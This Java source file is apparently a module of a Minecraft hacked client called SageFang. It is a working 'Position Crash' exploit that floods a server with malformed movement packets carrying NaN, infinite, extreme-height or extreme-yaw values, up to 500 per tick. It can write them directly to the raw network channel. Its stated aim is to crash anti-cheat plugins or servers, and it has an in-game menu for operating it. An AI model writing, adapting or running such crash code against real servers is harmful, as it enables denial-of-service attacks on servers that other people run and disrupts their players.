package com.tricrotism.modules.crash;

import com.tricrotism.SageFang;
import com.tricrotism.api.eventbus.EventHandler;
import com.tricrotism.api.modules.Category;
import com.tricrotism.api.modules.Module;
import com.tricrotism.api.settings.Settings;
import com.tricrotism.events.game.GameQuitEvent;
import com.tricrotism.events.world.TickEvent;
import com.tricrotism.mixin.accessors.ConnectionAccessor;
import imgui.ImGui;
import imgui.ImGuiIO;
import imgui.flag.ImGuiWindowFlags;
import io.netty.channel.Channel;
import net.minecraft.client.Minecraft;
import net.minecraft.network.Connection;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;

/**
 * Position crash exploit. Sends malformed position packets to trigger
 * server-side anti-cheat crashes or undefined behavior.
 * <p>
 * Targets LPX checks: POSITION_A (NaN/Infinity), POSITION_C (High Y),
 * POSITION_D (High Yaw).
 */
public class PositionCrash extends Module {

    public static final PositionCrash instance = new PositionCrash();

    private final Settings.Mode mode =
        mode("Mode", "mode", "Malformed-position variant", 0,
            "NaN", "Infinity", "-Infinity", "High Y", "High Yaw");
    private final Settings.Int speed =
        integer("Packets/tick", "speed", "Packets per tick", 50, 1, 500);
    private final Settings.Bool useRawChannel =
        bool("Use Raw Channel", "useRawChannel", "Write straight to the netty channel", true);

    private static final String[] MODE_LABELS = {"NaN", "Infinity", "-Infinity", "High Y", "High Yaw"};

    public PositionCrash() {
        super("positioncrash", "Position Crash", "Send malformed position packets to crash or exploit servers.", Category.COMBAT);
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!isActive()) return;

        Minecraft mc = Minecraft.getInstance();
        if (mc.player == null || mc.getConnection() == null) return;

        float playerYRot = mc.player.getYRot();
        float playerXRot = mc.player.getXRot();

        ServerboundMovePlayerPacket packet = buildPacket(mode.get(), playerYRot, playerXRot);

        int count = speed.get();

        if (useRawChannel.get()) {
            Connection connection = mc.getConnection().getConnection();
            Channel channel = ((ConnectionAccessor) connection).sagefang$getChannel();
            if (channel == null || !channel.isOpen()) return;

            for (int i = 0; i < count; i++) {
                channel.write(packet);
            }
            channel.flush();
        } else {
            for (int i = 0; i < count; i++) {
                mc.getConnection().send(packet);
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameQuitEvent event) {
        if (isActive()) {
            toggle();
        }
    }

    private static ServerboundMovePlayerPacket buildPacket(int mode, float yRot, float xRot) {
        return switch (mode) {
            case 0 -> // NaN
                new ServerboundMovePlayerPacket.PosRot(
                    Double.NaN, Double.NaN, Double.NaN,
                    Float.NaN, Float.NaN,
                    false, false
                );
            case 1 -> // Infinity
                new ServerboundMovePlayerPacket.PosRot(
                    Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY,
                    yRot, xRot,
                    false, false
                );
            case 2 -> // -Infinity
                new ServerboundMovePlayerPacket.PosRot(
                    Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY,
                    yRot, xRot,
                    false, false
                );
            case 3 -> // High Y
                new ServerboundMovePlayerPacket.PosRot(
                    0.0, 500_000.0, 0.0,
                    yRot, xRot,
                    false, false
                );
            case 4 -> // High Yaw
                new ServerboundMovePlayerPacket.Rot(
                    2_000_000f, xRot,
                    false, false
                );
            default -> new ServerboundMovePlayerPacket.PosRot(
                Double.NaN, Double.NaN, Double.NaN,
                Float.NaN, Float.NaN,
                false, false
            );
        };
    }

    @Override
    public void frame(ImGuiIO io) {
        try {
            if (!isVisible()) return;

            int flags = ImGuiWindowFlags.AlwaysAutoResize;
            ImGui.setNextWindowBgAlpha(0.45f);
            ImGui.begin(title, flags);

            if (ImGui.checkbox("Enabled##pcEnabled", isActive())) {
                toggle();
            }
            ImGui.separator();

            // Mode combo
            mode.render();

            // Speed slider
            int[] speedArr = {speed.get()};
            if (ImGui.sliderInt("Packets/tick##pcSpeed", speedArr, 1, 500)) {
                speed.set(speedArr[0]);
            }

            // Raw channel toggle
            boolean raw = useRawChannel.get();
            if (ImGui.checkbox("Use Raw Channel##pcRaw", raw)) {
                useRawChannel.set(!raw);
            }
            if (ImGui.isItemHovered()) {
                ImGui.setTooltip("Use raw Netty channel for higher throughput");
            }

            ImGui.separator();

            // Current mode description
            String desc = mode.option();
            ImGui.text("Active: " + desc);

            ImGui.end();
        } catch (Exception e) {
            SageFang.LOGGER.error("Error in PositionCrash menu", e);
        }
    }
}
